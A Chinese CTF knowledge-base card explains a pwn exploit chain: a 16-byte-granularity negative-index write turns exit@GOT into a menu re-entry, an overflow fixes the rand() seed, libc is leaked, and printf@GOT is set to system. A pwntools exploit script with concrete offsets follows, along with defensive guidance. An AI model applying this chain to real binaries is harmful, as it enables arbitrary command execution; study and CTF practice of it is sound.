---
id: ctf-pwn-got-write-granularity-exit-got-loop-ret2system
title: 反向越界写 GOT 但粒度被卡到 16 字节：先把 exit@GOT 改成菜单函数换取无限次写，再泄 libc 把 printf@GOT 改 system
type: scenario
domain: ctf
path: ctf/pwn
technique: got-overwrite-coarse-granularity-exit-loop
tags:
- ctf
- pwn
- got-overwrite
- oob-write
- libc-leak
- prng-bypass
- ret2libc
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:41:05+08:00'
  notes: 已对照原文核对；本次核对未读取图片；正文明确写「存在反向越界，可以修改got 这里的话 16一次有点恶心，我的思路是先修改exit_got表为buy 无限次执行这个漏洞 再泄露libc地址 去修改printf_got 为system地址 最后把exit改为后门地址」，与卡片策略一致；exp 中 seed=0x41414141 经 ctypes.CDLL(libc).srand 复算 rand()、id 输入 A*0x10、-4 选项写 p64(0x40133B)+p64(0x401511)、-6 泄 libc 减 0x46061、-7 写 p64(system) 亦与卡片 PoC 逐行对应。未验证点：0x40133B 与 0x401511 分别对应 buy 与后门地址（原文未标注函数名，卡片按 16 字节窗口写法沿用），本题 checksec 与具体 GOT 布局仅见于未读截图
url: /docs/ctf/pwn/ctf-pwn-got-write-granularity-exit-got-loop-ret2system/
draft: false
kb_aliases:
- 16 字节粒度写 GOT
- exit@GOT 换 buy 无限次写
- 反向越界改 GOT
- 溢出改 seed 绕随机数
- GOT 写粒度受限怎么办
---

## 一句话结论

程序的漏洞是一个「按 16 字节为单位反向越界写」的菜单操作，一次只能改 16 字节且写完就可能退出；作者的处理顺序是：先用溢出连带改掉 `seed` 让随机数门控恒成立，再用这次越界把 `exit@GOT` 改成菜单函数地址，使「退出」变成「重进菜单」，从而把「只能改一次」变成「可以改无限次」；随后用越界读泄 libc，把 `printf@GOT` 写成 `system`、把 `exit@GOT` 写成后门，完成利用。

## 原理

- **写粒度决定策略**：越界写的偏移必须以 16 字节为单位步进（`addr = base + i*16`），而 GOT 表项之间只差 8 字节，于是「想写某个 GOT 项」往往要连带覆盖相邻 8 字节（可能是另一个 GOT 项或数据）。单次利用很难既写对目标又不破坏邻居，所以必须先把「一次」变成「多次」。
- **用程序自己的函数当"重入器"**：把 `exit@GOT` 改成菜单/下单函数的入口地址后，程序在正常退出点不会真的退出，而是回到主流程，越界写原语立刻又能用一次。这一步不依赖任何 libc 知识，纯用二进制内地址即可，是整条链最稳的一环。
- **溢出顺带改 seed 为什么能破随机门控**：菜单用 `srand(seed); rand()` 生成认证码并要求用户输入相同的值；`seed` 紧邻 id 输入缓冲区，于是发送 `0x10` 字节填充（如 `'A'*0x10`）就把 `seed` 覆盖成可控常量（`0x41414141`）。种子一旦固定，认证码就是确定的：本地用同一 libc `ctypes.CDLL('./libc.so.6').srand(0x41414141)` 复算首个 `rand()` 即可直接答对，随机门控名存实亡——这正是「用溢出把不可预测变成可预测」，而不是靠猜概率。
- **泄 libc 的来源**：越界读/写之后，`printf` 类输出的缓冲区或 GOT 中已解析的项会带出 libc 指针，减去偏移即基址；有了基址，`printf@GOT = system` 意味着之后任意一次打印「看起来像命令」的字符串就等于命令执行。
- **为什么最后还要改 exit**：`printf@GOT` 被换成 `system` 后，程序退出时若走到 `exit@GOT` 仍会正常退出，把 `exit@GOT` 指向一个能接受参数的函数（或后门）可以让「退出路径」再触发一次执行，保证在不可靠交互下仍有第二次落地机会。

## 触发条件

- 存在按固定步长（本例 16 字节）反向（负下标）越界的读/写原语，且下标或偏移由用户输入决定，没有下界检查。
- 二进制 Partial RELRO（GOT 可写），且 `exit`/`printf` 等常用函数在 GOT 中有表项。
- 缓冲区与 `seed` 等门控变量在栈上相邻，可通过一次溢出同时改写。
- 目标 libc 可获取（或能通过泄漏反推版本），以确定 `system` 与 `/bin/sh` 偏移。
- 程序在写完一次后不会立刻销毁会话——否则连「改 exit 再重进」的机会都没有。

## 利用步骤

1. 逆向确认越界原语：`base + index * 16` 的寻址方式、index 是否允许负数、读写长度是否也被限制为 16 字节；用 `objdump -R` 列出 GOT 布局与目标项的相对偏移。
2. 计算把 `exit@GOT` 覆盖成菜单函数时 16 字节窗口内会连带写到哪些 GOT 项，选一个「连带破坏但不立即使用」的项（或先用一次写把邻居修成无害值）。
3. 用溢出把 `seed` 改成能让 `rand()` 恒放行的值：本地用同版本 libc 以 `ctypes.CDLL('./libc.so.6')` 复算 `srand(seed); rand()%N`，挑出满足门控的种子。
4. 触发越界写把 `exit@GOT` 改成菜单函数入口；之后每次选择退出都会回到菜单，写原语可重复使用。
5. 反复用越界读/越界写把 `printf@GOT` 泄露项读出解析 libc 基址（或读 GOT 里已解析的另一项），核对低 12 位对齐。
6. 把 `printf@GOT` 写成 `system`；下一次让程序打印含命令的字符串，即执行命令（如 `cat flag`），因 `system` 返回值被忽略，命令输出直接进响应。
7. 若还需要二次触发，把 `exit@GOT` 写到后门/`main` 入口，保证退出路径可用。
8. 失败排查顺序：16 字节窗口连带破坏导致后续崩溃 → 改窗口或先修邻居；`seed` 复算与目标 libc 不一致 → 换本地同版本 libc；`printf` 已被调用过导致 GOT 已解析 → 直接用解析后的地址算基址。

## PoC

越界写与 GOT 目标的骨架（`idx` 为负、步长 16，具体数值按目标二进制）：

```python
from pwn import *
context(arch='amd64', os='linux')
elf = ELF('./pwn')
libc = elf.libc

# 1) 溢出改 seed：0x10 字节填充把 seed 覆盖成 0x41414141，本地复算出认证码
seed = 0x41414141
libc_1 = ctypes.CDLL('./libc.so.6')
libc_1.srand(seed)
io.recvuntil(b'input yours id\n')
io.send(b'A' * 0x10)                                   # 覆盖 seed
io.recvuntil(b'Input yours id authentication code:\n')
io.send(str(libc_1.rand()).encode())                   # 与 srand(0x41414141) 对齐

# 2) 第一次 16 字节越界写：把 exit@GOT 改成 buy（菜单）地址，换取无限次写
io.send(b'-4')
io.recvuntil(b'which one to choose\n')
io.send(p64(0x40133B) + p64(0x401511))                 # buy 与后门都在同一 16 字节窗口

# 3) 越界泄 libc
io.send(b'-6')
io.recvuntil(b'which one to choose\n')
io.send(b'a')
io.recvuntil(b'succeed\n')
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x46061   # 偏移按目标 libc
libc.address = libc_base

# 4) printf@GOT = system
io.send(b'-7')
io.recvuntil(b'which one to choose\n')
io.send(p64(libc.sym['system']))

# 5) exit@GOT 指向后门，退出路径再触发一次
io.send(b'-4')
io.send(p64(0x401511))
io.interactive()
```

```text
要点：
1) 写粒度 16 字节 → 先把 exit@GOT 换成菜单函数，换取无限次写；
2) 顺序必须是「先修出口、再泄地址、最后换 printf」；
3) 每次写都要检查 16 字节窗口内的邻居会不会被破坏。
```

## 变体与关联

- **变体一（重入器换成别的函数）**：若 `exit` 不在 GOT 或被连带破坏，可把越界写指向 `atoi`/`read`/菜单循环处的 `scanf` 一类「每轮必调」的项，效果同样是延长原语的可用次数。
- **变体二（写原语变成"只写 8 字节"）**：粒度更细时就不需要重入器，可直接一次写准目标 GOT 项；反过来说，本卡的整套绕法是「粒度 > 表项间距」时的通用补救。
- **变体三（不靠 GOT，靠 hook）**：若 Full RELRO，GOT 只读，需改打 `__free_hook`/`__malloc_hook` 或返回地址；再叠加一次泄漏即回到熟悉的 free_hook 路线。
- **关联**：[[ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system]]（同样是负下标越界 + GOT 改 `system`，但那条步长 0x30 且可直接命中 `puts@GOT`，不需要「先改 exit 换无限次」这层）、[[ctf-pwn-negative-index-pointer-array-stdout-freehook-system]]（负下标改全局指针泄 libc 的另一种落点）、[[ctf-pwn-unseeded-rand-array-oob-bound-overwrite-ret2win]]（同样是「溢出改门控变量让随机数门失效」，但目标改成返回地址 ret2win）、[[ctf-pwn-time-seed-hash-replay-partial-leak-libc]]（本地复算 `srand/rand` 序列的方法）。

## 检测与防御

- **修复原语**：越界读写的下标必须同时校验上下界，且偏移按「元素个数」而不是「字节数」做乘法；写入长度的上限要与目标结构体大小严格一致，不能出现"步长比结构体大"的可乘之机。
- **编译加固**：Full RELRO 让 GOT 只读；PIE + ASLR 让"改 GOT 成二进制内地址"失去固定目标；`-fstack-protector` 保护门控变量与缓冲区之间的布局。
- **逻辑加固**：随机门控不应依赖用户可控的 `seed`，更不应把 `seed` 放在可溢出的缓冲区旁边；用 `getrandom()` 生成不可预测值并放在独立存储。
- **检测信号**：交互中出现大量重复的菜单选择与 16 字节整块写入；同一会话反复选择"退出"但连接不断；`exit@GOT`/`printf@GOT` 在运行期被改写（可用 `LD_PRELOAD` 或 GOT 完整性校验发现）。
- **排查**：CTF 之外若在真实程序中发现"退出不退出"的异常行为，应优先检查 GOT/函数指针是否被越界写篡改。
